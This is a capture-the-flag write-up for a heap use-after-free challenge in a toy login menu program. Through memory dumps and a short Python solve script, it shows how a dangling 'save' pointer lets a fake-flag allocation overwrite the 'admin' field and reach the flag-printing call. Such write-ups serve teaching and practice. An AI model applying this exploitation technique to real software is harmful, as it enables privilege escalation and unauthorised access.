
The program allows us to login, sign out, print flag, lock and restore user. Login ``malloc`` a block of memory on heap, it takes the 31 bytes input for username, adds 1 byte for end of string, allocated user is pointed to by ``curr`` pointer. Sign out free the address that ``curr`` points to. Lock user operation makes ``save`` pointer points to same address as ``curr`` does, while restore operation does the opposite, it points ``curr`` to address pointed to by ``save``. If ``admin`` field is set print flag operation call ``system`` to print out the flag, otherwise, it allows us to input a fake one. 

```c
struct creds {
  void *padding;
  char name[32];
  int admin;
};

struct creds *curr;
struct creds *save;

char *fake_flag;

```

Login the first time with username ``aaaaaaaabbbbbbbbccccccccddddddd``.

```bash
0x5555556032a0: 0x0000000000000000      0x6161616161616161
0x5555556032b0: 0x6262626262626262      0x6363636363636363
0x5555556032c0: 0x0064646464646464      0x0000000000000000
0x5555556032d0: 0x0000000000000000      0x0000000000020d31
0x5555556032e0: 0x0000000000000000      0x0000000000000000
```

Lock user to make ``save`` point to ``curr``, logout current user to free ``curr``, but ``save`` pointer still points to address ``0x5555556032a0``.

```bash
0x5555556032a0: 0x0000000000000000      0x0000555555603010
0x5555556032b0: 0x6262626262626262      0x6363636363636363
0x5555556032c0: 0x0064646464646464      0x0000000000000000
0x5555556032d0: 0x0000000000000000      0x0000000000020d31
0x5555556032e0: 0x0000000000000000      0x0000000000000000
```

Print flag now we are allowed to input a fake flag, ``fake_flag`` pointer will be allocated an area that previously freed and pointed to by ``save`` pointer. We need to input enough bytes to cover the struct so that ``admin`` field could be set to 1.

```bash
0x5555556032a0: 0x3131313131313131      0x3131313131313131
0x5555556032b0: 0x3131313131313131      0x3131313131313131
0x5555556032c0: 0x3131313131313131      0x3131313131313131
0x5555556032d0: 0x000000000000000a      0x0000000000020d31
0x5555556032e0: 0x0000000000000000      0x0000000000000000
```

Now we restore user to reuse data pointed to by ``save`` pointer. Print again flag, as this moment the ``admin`` field is set to 1, we are able to get to the call to ``system`` function.

```bash
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
> 3
Here's your flag:
[Detaching after vfork from child process 8343]
/bin/cat: /flag.txt: No such file or directory
```

Repeat the operations on server to get the flag.

```python
menu = Menu(remote)

menu.login('A'*31)
menu.lock_user()
menu.sign_out()
menu.print_flag(b'\x01'*40)
menu.restore_user()
menu.print_flag("")
```
